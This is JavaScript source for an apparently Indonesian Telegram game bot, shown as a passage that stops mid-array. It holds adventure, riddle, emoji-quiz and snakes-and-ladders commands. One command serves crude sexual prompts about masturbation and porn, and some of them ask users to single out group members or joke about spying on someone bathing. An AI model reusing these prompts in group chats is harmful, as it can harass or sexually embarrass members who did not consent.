bot.onText(/\/petualangan(?:@[\w_]+)?/, async (msg) => {
  const chatId = msg.chat.id;

  const ceritaAwal = `🌍 Selamat datang di *Petualangan Seru*!\n
Kamu terbangun di sebuah hutan misterius.
Apa yang akan kamu lakukan?`;

  await bot.sendMessage(chatId, ceritaAwal, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🌲 Jelajahi Hutan", callback_data: "petualangan_hutan" },
          { text: "🏰 Pergi ke Kastil", callback_data: "petualangan_kastil" },
        ],
        [{ text: "⚓ Menyusuri Sungai", callback_data: "petualangan_sungai" }],
      ],
    },
  });
});

// HANDLER SEMUA CALLBACK QUERY PETUALANGAN
// (pastikan cuma ADA SATU handler callback_query di project,
// kalau ada game lain, gabung di sini juga)
bot.on("callback_query", async (query) => {
  const data = query.data;
  const msg = query.message;
  if (!msg) return;        // jaga-jaga kalau dari inline mode

  const chatId = msg.chat.id;

  // jawab loading tombol
  try {
    await bot.answerCallbackQuery(query.id);
  } catch (e) {
    // biarin aja kalau udah pernah dijawab di handler lain
  }

  // ================== MENU AWAL (untuk tombol "Kembali") ==================
  if (data === "petualangan") {
    const ceritaAwal = `🌍 Selamat datang di *Petualangan Seru*!\n
Kamu terbangun di sebuah hutan misterius.
Apa yang akan kamu lakukan?`;

    return bot.sendMessage(chatId, ceritaAwal, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🌲 Jelajahi Hutan", callback_data: "petualangan_hutan" },
            { text: "🏰 Pergi ke Kastil", callback_data: "petualangan_kastil" },
          ],
          [
            {
              text: "⚓ Menyusuri Sungai",
              callback_data: "petualangan_sungai",
            },
          ],
        ],
      },
    });
  }

  // ================== HUTAN ==================
  if (data === "petualangan_hutan") {
    return bot.sendMessage(
      chatId,
      "🌲 Kamu berjalan ke dalam hutan gelap, terdengar suara serigala...\nApa yang kamu pilih?",
      {
        reply_markup: {
          inline_keyboard: [
            [
              { text: "🏃‍♂️ Lari", callback_data: "hutan_lari" },
              { text: "🙈 Bersembunyi", callback_data: "hutan_sembunyi" },
            ],
          ],
        },
      }
    );
  }

  if (data === "hutan_lari") {
    return bot.sendMessage(
      chatId,
      "🏃‍♂️ Kamu lari sekencang-kencangnya, tapi serigala mengejarmu!\n\nKamu melihat sebuah pohon besar. Apa yang kamu lakukan?",
      {
        reply_markup: {
          inline_keyboard: [
            [
              { text: "🌳 Panjat Pohon", callback_data: "hutan_panjat" },
              { text: "⚔️ Lawan Serigala", callback_data: "hutan_lawan" },
            ],
          ],
        },
      }
    );
  }

  if (data === "hutan_sembunyi") {
    return bot.sendMessage(
      chatId,
      "🙈 Kamu bersembunyi di semak-semak. Serigala lewat dan tidak melihatmu.\n\nKamu menemukan jalan rahasia menuju sebuah gua bercahaya!",
      {
        reply_markup: {
          inline_keyboard: [
            [
              { text: "🦇 Masuk Gua", callback_data: "hutan_gua" },
              { text: "⬅️ Kembali", callback_data: "petualangan" },
            ],
          ],
        },
      }
    );
  }

  if (data === "hutan_panjat") {
    return bot.sendMessage(
      chatId,
      "🌳 Kamu berhasil panjat pohon! Serigala menunggu di bawah...\n\nNamun kamu melihat sarang burung emas di atas. Apa mau diambil?",
      {
        reply_markup: {
          inline_keyboard: [
            [
              { text: "🥚 Ambil Telur Emas", callback_data: "ending_telur" },
              { text: "🙅‍♂️ Abaikan", callback_data: "ending_selamat" },
            ],
          ],
        },
      }
    );
  }

  if (data === "hutan_lawan") {
    return bot.sendMessage(
      chatId,
      "⚔️ Kamu mencoba melawan serigala dengan tangan kosong... sayangnya serigala terlalu kuat.\n\n💀 *Kamu kalah!*",
      { parse_mode: "Markdown" }
    );
  }

  if (data === "hutan_gua") {
    return bot.sendMessage(
      chatId,
      "🦇 Kamu masuk ke gua bercahaya, ternyata ada naga tidur di dalamnya!\n\nApa kamu akan mengambil harta karun atau kabur?",
      {
        reply_markup: {
          inline_keyboard: [
            [
              { text: "💰 Ambil Harta Karun", callback_data: "ending_naga" },
              { text: "🏃 Kabur Cepat", callback_data: "ending_selamat" },
            ],
          ],
        },
      }
    );
  }

  // ================== KASTIL ==================
  if (data === "petualangan_kastil") {
    return bot.sendMessage(
      chatId,
      "🏰 Kamu sampai di kastil tua. Pintu terbuka sendiri...\n\nApa yang akan kamu lakukan?",
      {
        reply_markup: {
          inline_keyboard: [
            [
              { text: "🚪 Masuk", callback_data: "kastil_masuk" },
              { text: "⬅️ Kembali", callback_data: "petualangan" },
            ],
          ],
        },
      }
    );
  }

  if (data === "kastil_masuk") {
    return bot.sendMessage(
      chatId,
      "👻 Kamu masuk ke kastil gelap, hantu muncul!\n\nApa kamu mau melawan atau kabur?",
      {
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⚔️ Lawan Hantu", callback_data: "kastil_lawan" },
              { text: "🏃 Kabur", callback_data: "ending_selamat" },
            ],
          ],
        },
      }
    );
  }

  if (data === "kastil_lawan") {
    return bot.sendMessage(
      chatId,
      "⚔️ Kamu melawan hantu dengan keberanianmu...\n\nTernyata hantu itu hanya ilusi! Kamu menemukan mahkota emas!\n\n👑 *Kamu Menang!*",
      { parse_mode: "Markdown" }
    );
  }

  // ================== SUNGAI ==================
  if (data === "petualangan_sungai") {
    return bot.sendMessage(
      chatId,
      "⚓ Kamu naik rakit menyusuri sungai... tiba-tiba buaya besar muncul!\n\nApa yang akan kamu lakukan?",
      {
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⚔️ Lawan Buaya", callback_data: "sungai_lawan" },
              { text: "🏊‍♂️ Lompat & Kabur", callback_data: "sungai_kabur" },
            ],
          ],
        },
      }
    );
  }

  if (data === "sungai_lawan") {
    return bot.sendMessage(
      chatId,
      "⚔️ Kamu melawan buaya dengan dayung... secara ajaib kamu menang!\n\nKamu menemukan peti harta di tepi sungai!\n\n💎 *Kamu Menang!*",
      { parse_mode: "Markdown" }
    );
  }

  if (data === "sungai_kabur") {
    return bot.sendMessage(
      chatId,
      "🏊‍♂️ Kamu lompat ke sungai dan kabur...\n\nSayangnya arus deras membawamu jatuh ke air terjun.\n\n💀 *Kamu kalah!*",
      { parse_mode: "Markdown" }
    );
  }

  // ================== ENDING ==================
  if (data === "ending_telur") {
    return bot.sendMessage(
      chatId,
      "🥚 Kamu mengambil telur emas... tiba-tiba pohon runtuh!\n\n💀 *Kamu kalah karena serakah!*",
      { parse_mode: "Markdown" }
    );
  }

  if (data === "ending_naga") {
    return bot.sendMessage(
      chatId,
      "🐉 Kamu mencoba mengambil harta karun, tapi naga bangun dan membakar gua.\n\n💀 *Kamu kalah!*",
      { parse_mode: "Markdown" }
    );
  }

  if (data === "ending_selamat") {
    return bot.sendMessage(
      chatId,
      "🎉 Kamu berhasil selamat dari petualangan ini!\n\n👏 *Kamu Menang dengan selamat!*",
      { parse_mode: "Markdown" }
    );
  }
});
// ============== COMMAND /tebaktebakan ==============
bot.onText(/\/tebaktebakan(?:@[\w_]+)?/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const res = await axios.get("https://api-faa.my.id/faa/tebaktebakan");
    const data = res.data;

    if (!data || !data.status || !data.result) {
      return bot.sendMessage(chatId, "⚠️ Gagal mengambil soal dari API.");
    }

    const soal = data.result.soal;
    const jawaban = String(data.result.jawaban || "")
      .toLowerCase()
      .trim();

    // Kirim soal ke chat
    const sent = await bot.sendMessage(
      chatId,
      `🧠 *Game Tebak-Tebakan*\n\n❓ ${soal}\n\n💬 *Balas (reply) pesan ini untuk menjawab.*\n\nKetik */nyerah* (dengan reply ke pesan ini) kalau mau lihat jawabannya.`,
      { parse_mode: "Markdown" }
    );

    // Simpan jawaban benar terkait dengan pesan soal itu
    const key = `${chatId}:${sent.message_id}`;
    tebakanAktif[key] = {
      answer: jawaban,
    };
  } catch (err) {
    console.error("Error tebaktebakan:", err.message);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat menghubungi API Tebak-Tebakan.");
  }
});

// ============== CEK JAWABAN / MENYERAH (HARUS REPLY) ==============
bot.on("message", async (msg) => {
  // Abaikan pesan dari bot sendiri
  if (msg.from && msg.from.is_bot) return;

  const chatId = msg.chat.id;

  // Hanya proses jika pesan ini adalah reply
  if (!msg.reply_to_message) return;

  const replied = msg.reply_to_message;
  const key = `${chatId}:${replied.message_id}`;
  const sesi = tebakanAktif[key];

  // Kalau reply ke pesan lain yang bukan soal tebak-tebakan, skip
  if (!sesi) return;

  const userAnswerRaw = String(msg.text || "");
  const userAnswer = userAnswerRaw.toLowerCase().trim();
  if (!userAnswer) return;

  // ==== FITUR /nyerah ====
  if (userAnswer.startsWith("/nyerah")) {
    await bot.sendMessage(
      chatId,
      `😵 Oke, kamu nyerah.\n\n✅ Jawaban yang benar adalah: *${sesi.answer}*`,
      {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id,
      }
    );

    // Hapus sesi soal ini karena sudah dibocorin jawabannya
    delete tebakanAktif[key];
    return;
  }

  // ==== CEK JAWABAN BIASA ====
  if (userAnswer === sesi.answer) {
    // Jawaban benar
    await bot.sendMessage(
      chatId,
      `✅ Jawaban *benar*, ${msg.from.first_name}!`,
      {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id,
      }
    );

    // Setelah ada yang benar, hapus sesi soal ini
    delete tebakanAktif[key];
  } else {
    // Jawaban salah
    await bot.sendMessage(
      chatId,
      `❌ Jawaban *salah*, coba lagi ya!`,
      {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id,
      }
    );
  }
});
// =================== TEBAK EMOJI GAME ===================
const tebakEmojiSoal = [
  // --- Buah & Makanan ---
  { soal: "🍎🍌🍇", pilihan: ["Buah-buahan", "Sayuran", "Makanan Cepat Saji", "Minuman"], jawaban: "Buah-buahan" },
  { soal: "🍔🍟🌭", pilihan: ["Makanan Cepat Saji", "Buah", "Sayuran", "Olahraga"], jawaban: "Makanan Cepat Saji" },
  { soal: "🍕🥪🥙", pilihan: ["Makanan Barat", "Sayuran", "Hewan", "Alat Musik"], jawaban: "Makanan Barat" },
  { soal: "🍵☕🥤", pilihan: ["Minuman", "Makanan", "Elektronik", "Olahraga"], jawaban: "Minuman" },
  { soal: "🥦🥕🥬", pilihan: ["Sayuran", "Buah", "Olahraga", "Transportasi"], jawaban: "Sayuran" },
  { soal: "🍓🍒🍉", pilihan: ["Buah-buahan", "Hewan", "Bangunan", "Alat Musik"], jawaban: "Buah-buahan" },

  // --- Olahraga & Aktivitas ---
  { soal: "⚽🏀🏐", pilihan: ["Olahraga", "Musik", "Makanan", "Alat Tulis"], jawaban: "Olahraga" },
  { soal: "🏊‍♂️🚴‍♂️🏋️‍♀️", pilihan: ["Olahraga", "Makanan", "Transportasi", "Buah"], jawaban: "Olahraga" },
  { soal: "🎮🕹️👾", pilihan: ["Game", "Olahraga", "Makanan", "Musik"], jawaban: "Game" },

  // --- Hewan ---
  { soal: "🐶🐱🐰", pilihan: ["Hewan", "Buah", "Olahraga", "Makanan"], jawaban: "Hewan" },
  { soal: "🦁🐯🐻", pilihan: ["Hewan", "Makanan", "Olahraga", "Bangunan"], jawaban: "Hewan" },
  { soal: "🐠🐟🦈", pilihan: ["Ikan", "Buah", "Olahraga", "Alat Musik"], jawaban: "Ikan" },
  { soal: "🦅🦉🕊️", pilihan: ["Burung", "Buah", "Olahraga", "Transportasi"], jawaban: "Burung" },

  // --- Transportasi ---
  { soal: "🚗🚌🏍️", pilihan: ["Kendaraan", "Rumah", "Buah", "Hewan"], jawaban: "Kendaraan" },
  { soal: "🚂✈️🚢", pilihan: ["Transportasi Jarak Jauh", "Buah", "Olahraga", "Bangunan"], jawaban: "Transportasi Jarak Jauh" },
  { soal: "🚴‍♂️🛴🛹", pilihan: ["Transportasi Ringan", "Makanan", "Olahraga", "Buah"], jawaban: "Transportasi Ringan" },

  // --- Musik & Hiburan ---
  { soal: "🎸🥁🎤", pilihan: ["Musik", "Olahraga", "Transportasi", "Sayuran"], jawaban: "Musik" },
  { soal: "🎧📻🎼", pilihan: ["Musik", "Makanan", "Elektronik", "Bangunan"], jawaban: "Musik" },
  { soal: "🎬🎥🍿", pilihan: ["Film", "Makanan", "Transportasi", "Olahraga"], jawaban: "Film" },

  // --- Elektronik & Teknologi ---
  { soal: "📱💻🖥️", pilihan: ["Elektronik", "Makanan", "Hewan", "Minuman"], jawaban: "Elektronik" },
  { soal: "⌨️🖱️🖨️", pilihan: ["Peralatan Komputer", "Makanan", "Hewan", "Olahraga"], jawaban: "Peralatan Komputer" },
  { soal: "📷📹🎥", pilihan: ["Kamera", "Olahraga", "Buah", "Bangunan"], jawaban: "Kamera" },

  // --- Alam & Dunia ---
  { soal: "🌍🌕⭐", pilihan: ["Alam Semesta", "Makanan", "Transportasi", "Buah"], jawaban: "Alam Semesta" },
  { soal: "🔥💧🌪️", pilihan: ["Unsur Alam", "Buah", "Elektronik", "Olahraga"], jawaban: "Unsur Alam" },
  { soal: "⛰️🏝️🏜️", pilihan: ["Alam", "Bangunan", "Hewan", "Minuman"], jawaban: "Alam" },

  // --- Listrik & Energi ---
  { soal: "💡🔌🔋", pilihan: ["Listrik", "Olahraga", "Makanan", "Buah"], jawaban: "Listrik" },
  { soal: "⚡🔋🔦", pilihan: ["Energi", "Buah", "Makanan", "Transportasi"], jawaban: "Energi" },

  // --- Bangunan & Negara ---
  { soal: "🏰🗽🗿", pilihan: ["Bangunan Terkenal", "Buah", "Olahraga", "Minuman"], jawaban: "Bangunan Terkenal" },
  { soal: "🇯🇵🇮🇩🇺🇸", pilihan: ["Bendera Negara", "Makanan", "Olahraga", "Buah"], jawaban: "Bendera Negara" },
  { soal: "🏯🕌⛪", pilihan: ["Tempat Ibadah", "Makanan", "Buah", "Olahraga"], jawaban: "Tempat Ibadah" },

  // --- Profesi & Pekerjaan ---
  { soal: "👨‍⚕️👩‍🏫👨‍🍳", pilihan: ["Profesi", "Makanan", "Transportasi", "Buah"], jawaban: "Profesi" },
  { soal: "👮‍♂️👨‍🚒👩‍✈️", pilihan: ["Profesi", "Elektronik", "Olahraga", "Buah"], jawaban: "Profesi" },

  // --- Random Fun ---
  { soal: "🎁🎉🎂", pilihan: ["Ulang Tahun", "Transportasi", "Buah", "Olahraga"], jawaban: "Ulang Tahun" },
  { soal: "💍👑👒", pilihan: ["Aksesoris", "Makanan", "Buah", "Bangunan"], jawaban: "Aksesoris" },
  { soal: "🛏️🪑🚪", pilihan: ["Perabotan", "Makanan", "Hewan", "Buah"], jawaban: "Perabotan" },
];

let tebakEmojiActive = {};

// Command /tebakemoji
bot.onText(/\/tebakemoji(?:@[\w_]+)?/, (msg) => {
  const chatId = msg.chat.id;

  // Kalau masih ada soal aktif, jangan buat baru
  if (tebakEmojiActive[chatId]) {
    return bot.sendMessage(chatId, "Kamu masih punya soal yang belum dijawab!");
  }

  // Ambil soal random
  const soal = tebakEmojiSoal[Math.floor(Math.random() * tebakEmojiSoal.length)];
  tebakEmojiActive[chatId] = soal;

  bot.sendMessage(
    chatId,
    `Tebak arti dari emoji berikut:\n\n${soal.soal}`,
    {
      reply_markup: {
        inline_keyboard: soal.pilihan.map((pil) => ([
          {
            text: pil,
            // Prefix khusus biar gak tabrakan sama callback game lain
            callback_data: `tebakemoji_${pil}`,
          }
        ])),
      },
    }
  );
});

// Listener jawaban
bot.on("callback_query", async (query) => {
  const data = query.data;
  const msg = query.message;
  if (!msg) return;

  const chatId = msg.chat.id;

  // Hanya handle callback yang khusus untuk tebakemoji
  if (!data.startsWith("tebakemoji_")) {
    return; // biarin handler callback lain yang urus
  }

  // Jawab loading di tombol
  await bot.answerCallbackQuery(query.id);

  if (!tebakEmojiActive[chatId]) {
    return bot.sendMessage(chatId, "Tidak ada soal aktif! Ketik /tebakemoji lagi.");
  }

  const soal = tebakEmojiActive[chatId];
  const jawaban = data.replace("tebakemoji_", "");

  if (jawaban === soal.jawaban) {
    await bot.sendMessage(
      chatId,
      `✅ Benar! Jawabannya adalah *${soal.jawaban}*`,
      { parse_mode: "Markdown" }
    );
  } else {
    await bot.sendMessage(
      chatId,
      `❌ Salah! Jawaban yang benar adalah *${soal.jawaban}*`,
      { parse_mode: "Markdown" }
    );
  }

  // Hapus soal aktif setelah dijawab
  delete tebakEmojiActive[chatId];
});

// ================= GAME ULAR TANGGA =================
bot.onText(/\/ppspsjsj(?:@[\w_]+)?/, async (msg) => {
  const chatId = msg.chat.id;

  let posisiPemain = 1;

  const ular = {
    16: 6,
    47: 26,
    49: 11,
    56: 53,
    62: 19,
    64: 60,
    87: 24,
    93: 73,
    95: 75,
    98: 78,
  };

  const tangga = {
    1: 38,
    4: 14,
    9: 31,
    21: 42,
    28: 84,
    36: 44,
    51: 67,
    71: 91,
    80: 100,
  };

  function lemparDadu() {
    return Math.floor(Math.random() * 6) + 1;
  }

  function mainkanGiliran() {
    const dadu = lemparDadu();
    let pesan = `🎲 Kamu melempar dadu: *${dadu}*\n`;

    posisiPemain += dadu;

    if (posisiPemain > 100) {
      posisiPemain = 100;
    }

    if (ular[posisiPemain]) {
      pesan += `😱 Kena ular! Turun dari *${posisiPemain}* ke *${ular[posisiPemain]}*\n`;
      posisiPemain = ular[posisiPemain];
    } else if (tangga[posisiPemain]) {
      pesan += `🎉 Dapat tangga! Naik dari *${posisiPemain}* ke *${tangga[posisiPemain]}*\n`;
      posisiPemain = tangga[posisiPemain];
    } else {
      pesan += `📍 Posisi kamu sekarang di kotak *${posisiPemain}*\n`;
    }

    if (posisiPemain === 100) {
      pesan += `\n🏆 *Selamat!* Kamu berhasil mencapai 100 dan menang!`;
    }

    return pesan;
  }

  const hasil = mainkanGiliran();

  await bot.sendMessage(chatId, hasil, {
    parse_mode: "Markdown",
  });
});
// ===================== TEBAK PIKIRAN JOROK NGAKAK (100 pertanyaan) =====================
bot.onText(/\/tebakpikiranku(?:@[\w_]+)?/, async (msg) => {
  const chatId = msg.chat.id;
  const fromUser = msg.from.first_name;

  const pertanyaan = [
    "Kalau kamu punya remote buat pause waktu, apa hal nakal pertama yang kamu lakuin? 😏",
    "Pernah ga lagi coli terus tiba-tiba ada yang manggil? Gimana reaksimu? 🤣",
    "Lebih milih ga makan 3 hari atau ga coli 1 bulan? 😅",
    "Kalau ada artis yang tiba-tiba ngajak ngamar, siapa yang langsung kamu iyain? 😳",
    "Pilih: bokep HD tapi lemot atau bokep buram tapi lancar? 🤔",
    "Siapa orang di grup ini yang paling kelihatan mesum? Tag namanya! 😂",
    "Kalau hp-mu tiba-tiba kepegang emak, aplikasi apa yang paling kamu takutin kebuka duluan? 📱",
    "Pernah ga mimpi basah gara-gara orang yang ga kamu sangka? Ceritain dong 😝",
    "Kalau lagi coli terus listrik mati, lanjut atau berhenti? 🔦",
    "Lebih milih ketahuan pacar lagi coli atau ketahuan dosen lagi buka bokep? 🎓",
    "Kalau kamu bisa masuk ke otak temenmu, kira-kira hal mesum apa yang bakal kamu lihat? 👀",
    "Siapa di grup ini yang kayaknya paling sering nyimpen bokep di galeri? 📂",
    "Pernah ga pura-pura tidur biar bisa nguping orang lagi mesum? 🤫",
    "Kalau disuruh pilih: ga punya tangan atau ga punya internet, kamu pilih mana? 🤯",
    "Siapa tokoh kartun pertama yang bikin kamu mikir jorok waktu kecil? 🤭",
    "Lebih milih coli di kamar kos atau di wc umum? 🚽",
    "Kalau bot ini bisa ngasih rating tingkat mesummu (1-100), kira-kira kamu dapet berapa? 📊",
    "Pernah ga salah kirim bokep ke grup keluarga? Gimana rasanya? 😱",
    "Kalau ada malaikat pencatat coli, kira-kira bukunya udah tebel belum? 📖",
    "Kalau harus milih, coli pake tangan kanan atau tangan kiri? ✋🤚",
    "Pernah ga nonton bokep pake headset tapi colokan copot, terus kedengeran keras-keras? 🎧😂",
    "Kalau semua history browser kamu di-share ke grup ini, siapa yang paling kaget? 🌐",
    "Lebih milih coli ketahuan tetangga atau ketahuan guru ngaji? 😬",
    "Kalau ada jin bisa ngabulin 1 permintaan mesum, kamu minta apa? 🧞",
    "Kalau harus pilih pasangan dari grup ini buat roleplay nakal, siapa yang kamu pilih? 🎭",
    "Pernah ga pura-pura sakit biar bisa coli sendirian di rumah? 🤒",
    "Kalau ada aplikasi baca pikiran, hal pertama yang malu kalau ketahuan apa? 💭",
    "Kalau harus stop coli 1 tahun tapi dapet 1M, kamu sanggup ga? 💸",
    "Siapa di grup ini yang wajahnya polos tapi pikiran mesum? 😇👉😈",
    "Kalau kamu punya 3 keinginan jorok yang pasti terkabul, apa aja tuh? 😏🔥",
    "Lebih milih bokep Jepang atau bokep Barat? 🎥",
    "Kalau di hp-mu ada folder rahasia, isinya paling banyak apa? 📂",
    "Pernah ga mimpi nakal sama orang yang kamu benci? 😳",
    "Kalau ada kompetisi coli tercepat, kamu kira bisa juara berapa? 🏆",
    "Kalau emakmu tau seberapa sering kamu coli, kira-kira reaksinya gimana? 😭",
    "Siapa selebgram yang bikin kamu pengen buka IG tiap hari? 📸",
    "Kalau ada game rating mesum, kira-kira skor kamu berapa? 🎮",
    "Pernah ga kepergok buka bokep pas lagi sekolah/kampus? 📚",
    "Kalau harus pilih: coli tanpa suara atau coli sambil nyanyi dangdut? 🎶🤣",
    "Lebih milih tidur bareng temen mesum atau tidur sendirian di kuburan? 👻",
    "Kalau semua chat mesummu dipublish, siapa yang paling malu? 📲",
    "Pernah ga colinya pake barang aneh? Ceritain yang paling unik 🤣",
    "Kalau ada CCTV di kamar kamu, kira-kira berapa kali ketahuan coli seminggu? 📹",
    "Lebih milih ketahuan bokep history atau galeri penuh meme bokep? 😂",
    "Kalau harus pilih: nonton bokep di kelas atau di masjid? 😱",
    "Pernah ga colinya sampe ketiduran? 😴",
    "Kalau emakmu tiba-tiba masuk kamar, apa trikmu nutupin biar ga ketahuan? 🚪",
    "Kalau ada penghargaan 'raja coli', kira-kira kamu dapet peringkat berapa? 🏅",
    "Siapa di grup ini yang kayaknya diam-diam doyan bokep? 🤫",
    "Kalau bokep harus bayar tiap nonton, kira-kira kamu tekor berapa per bulan? 💳",
    "Pernah ga salah sebut nama artis bokep pas lagi ngobrol biasa? 😂",
    "Kalau harus pilih: coli tiap hari atau seks seminggu sekali? 🤔",
    "Kalau pacar/gebetanmu minta share history browser, berani kasih ga? 😅",
    "Pernah ga colinya pake imajinasi sama orang deket? 😳",
    "Kalau ada bot penghitung coli, kira-kira kamu udah berapa ribu kali? 📟",
    "Lebih milih ketahuan bokep sama adik atau sama bapak? 👀",
    "Kalau semua grup WA kamu dicek, grup mana yang paling mesum? 📱",
    "Siapa karakter game yang pernah bikin kamu mikir jorok? 🎮",
    "Pernah ga colinya di tempat ga wajar? (contoh: atap, kebun, sekolah) 🤣",
    "Kalau emakmu tau username twitter mesummu, gimana reaksi dia? 🐦",
    "Kalau ada sensor di tangan, kira-kira udah nyala berapa kali seminggu? 🔥",
    "Lebih milih coli pake sabun cair atau pake lotion? 🧴",
    "Pernah ga nonton bokep bareng temen? Reaksinya gimana? 😂",
    "Kalau harus pilih: coli di toilet pesawat atau di toilet kampus? ✈️🏫",
    "Siapa di grup ini yang paling kamu curigai punya folder rahasia bokep? 📂",
    "Kalau bot ini bisa kasih ranking 'tangan terkuat', kira-kira kamu juara ga? ✊",
    "Pernah ga ketiduran pas lagi nonton bokep? 📺",
    "Kalau emakmu nemuin file bokep, alasan apa yang kamu kasih? 🥴",
    "Kalau kamu harus ganti nama jadi nama artis bokep, pilih siapa? 🌟",
    "Lebih milih coli di siang bolong atau tengah malam? 🌞🌙",
    "Kalau ada aplikasi tracking coli, kira-kira notifikasimu sering bunyi ga? 📲",
    "Pernah ga kepikiran bokep pas lagi sholat/ibadah? 😬",
    "Kalau semua pikiran mesummu diputar di layar bioskop, siapa yang paling kamu takutin nonton? 🎬",
    "Kalau bokep dilarang seumur hidup, kira-kira kamu bisa survive ga? 🚫",
    "Siapa artis Indo yang paling sering masuk mimpi basahmu? 🇮🇩",
    "Pernah ga ketahuan buka bokep sama temen deket? Gimana reaksinya? 😂",
    "Kalau harus pilih: coli di kamar mandi umum atau di perpustakaan? 🏛️",
    "Lebih milih nyimpen bokep di laptop atau di HP? 💻📱",
    "Kalau emakmu tau seberapa banyak kuota habis buat bokep, kira-kira ngomel ga? 📶",
    "Pernah ga download bokep terus lupa hapus, ke-detect orang lain? 😱",
    "Kalau ada kartu member premium coli, kamu mau daftar ga? 💳",
    "Kalau semua orang tau fantasi nakalmu, siapa yang bakal ngejauh duluan? 😅",
    "Pernah ga ngaca sambil coli? 🤣",
    "Kalau bot ini bisa kasih prediksi umur, umur berapa kamu pensiun coli? ⏳",
    "Lebih milih coli 5x sehari atau ga coli sama sekali setahun? 🤯",
    "Kalau emakmu tau username IG fake mesummu, kira-kira gimana? 📸",
    "Pernah ga ketahuan colinya sama hewan peliharaanmu? 🐶🐱",
    "Kalau harus pilih: coli di kamar mandi kos atau di rooftop kos? 🏢",
    "Kalau semua riwayat colimu ditulis di buku, berapa jilid? 📚",
    "Kalau bokep jadi mata pelajaran sekolah, kira-kira nilai kamu A+ ga? 🅰️",
    "Siapa di grup ini yang paling cocok jadi duta bokep? 🤣",
    "Kalau kamu punya mesin waktu, siapa orang pertama yang pengen kamu intip pas lagi mandi? ⏳🚿"
  ];

  const randomQ = pertanyaan[Math.floor(Math.random() * pertanyaan.length)];

  const text =
    `🧠 *Game Tebak Pikiran Luu* 🧠\n\n` +
    `${fromUser}, jawab jujur ya!\n\n` +
    `👉 ${randomQ}`;

  await bot.sendMessage(chatId, text, {
    parse_mode: "Markdown",
  });
});
// ================= CEK SIFAT MASA KECIL ULTIMATE NGAKAK =================
const sifatMasaKecil = [
  "👶 Waktu kecil kamu sering nangis keras cuma gara-gara balon meletus 🎈😭",
  "👶 Kamu dulu suka nyuri gorengan emak tetangga, lalu pura-pura jadi ninja biar gak ketahuan 🥷😂",
  "👶 Pas kecil kamu kalau jatuh bukannya nangis, malah ketawa kayak lagi nonton lawak 🤣",
  "👶 Katanya dulu kalau makan bubur, kamu aduk sampai buburnya berubah jadi 'lumpur Lapindo' 🥣💀",
  "👶 Kamu kecil sering bikin orang tua kaget karena hobi sembunyi di lemari kayak Doraemon 📦🤣",
  "👶 Waktu kecil kamu pernah nangis cuma karena sendalnya ketukar sama sandal tetangga 👡😭",
  "👶 Kamu bocil paling jago sulap: bisa ngilangin uang jajan dalam 0,2 detik 🪄😂",
  "👶 Katanya kamu dulu suka tidur di posisi aneh, mirip logo yoga tingkat dewa 🧘‍♂️🤣",
  "👶 Kamu kecil kalau mandi gaya freestyle, butterfly, sampai gaya batu tenggelam 🏊‍♀️💦",
  "👶 Waktu kecil, setiap dikasih mainan baru, 5 menit langsung rusak… kamu calon 'tester mainan' sejati 🧸⚡",
  "👶 Kamu dulu sering salah manggil orang: manggil tukang sayur pake sebutan 'mama' 🤭🥬",
  "👶 Katanya kamu bocil paling jago kentut sambil senyum sok polos 🤣💨",
  "👶 Kamu dulu suka nyolong mic pas hajatan dan nyanyi lagu nggak jelas 🎤😂",
  "👶 Pas kecil kamu pernah kabur dari rumah, padahal cuma ngumpet di bawah kasur 🛏️🤣",
  "👶 Kamu bocil yang setiap kali jatuh bilang 'ga sakit kok', tapi hatinya rapuh 💔😂",
  "👶 Waktu kecil kamu suka curhat sama kipas angin biar suaranya jadi autotune 🎶😂",
  "👶 Kamu bocil paling drama: jatuh dikit langsung pingsan kayak sinetron 😵📺",
  "👶 Katanya dulu kalau tidur suka sambil ketawa, orang tua sampai mikir kamu habis nonton stand-up di mimpi 🤣💤",
  "👶 Kamu kecil kalau nangis suaranya bisa tembus satu RT, kayak alarm kebakaran 🚨😭",
  "👶 Kamu bocil paling gaul, punya HP mainan tapi pura-pura lagi nelpon presiden 📱😂",
  "👶 Waktu kecil kamu sering kabur pake sepeda roda tiga, feeling explorer banget 🚲🤣",
  "👶 Kamu bocil yang tiap pipis suka nembak ke arah random, efek air mancur nasional ⛲😂",
  "👶 Katanya dulu kamu suka gigit sandal sampai jadi seni abstrak 👡🎨",
  "👶 Kamu bocil paling kreatif, pernah bikin 'masakan' dari tanah, batu, dan daun 🌿🍲",
  "👶 Waktu kecil kamu sering nyanyi lagu iklan TV dengan penuh perasaan 📺🎶",
  "👶 Kamu bocil paling jago tidur di mana aja, bahkan di ember cucian 🪣😂",
  "👶 Katanya dulu kamu kalau naik motor mainan pura-pura ngebut sambil teriak 'ngenggggg' 🏍️🤣",
  "👶 Kamu bocil yang tiap kali nangis, ujung-ujungnya dikasih permen biar diem 🍭😂",
  "👶 Kamu kecil suka nempel di kipas angin biar rambutmu jadi anime mode 💨🤣",
  "👶 Waktu kecil kamu sering pura-pura sakit biar gak sekolah, padahal mau main layangan 🪁😂",
  "👶 Kamu bocil paling legend, pernah mandi hujan sambil nyanyi kayak konser alam 🌧️🎤",
  "👶 Waktu kecil kamu suka nyolong sabun mandi terus mainin kayak slime 🧼😂",
  "👶 Kamu bocil yang hobinya nangis kalo nggak dibeliin ciki 😭🍟",
  "👶 Katanya kamu dulu suka ngupil terus dilempar ke tembok kayak ninja star 🤧😂",
  "👶 Kamu bocil paling jago rebutan kursi plastik pas acara keluarga 🪑🤣",
  "👶 Waktu kecil kamu pernah nangis gara-gara kartun favorit dimatiin bapak 😭📺",
  "👶 Kamu bocil yang suka pakai bantal guling kayak senjata ninja 🥷🛏️",
  "👶 Katanya kamu dulu suka tidur sambil ngemut remote TV 📺😂",
  "👶 Kamu bocil paling centil, suka pake bedak sampe mirip hantu 👻🤣",
  "👶 Waktu kecil kamu suka nangis gara-gara nggak bisa buka permen sendiri 🍬😭",
  "👶 Kamu bocil paling hobi main hujan, padahal abis itu sakit pilek 🤧🌧️",
  "👶 Katanya kamu kecil sering gigit kabel charger dikira ciki 😅⚡",
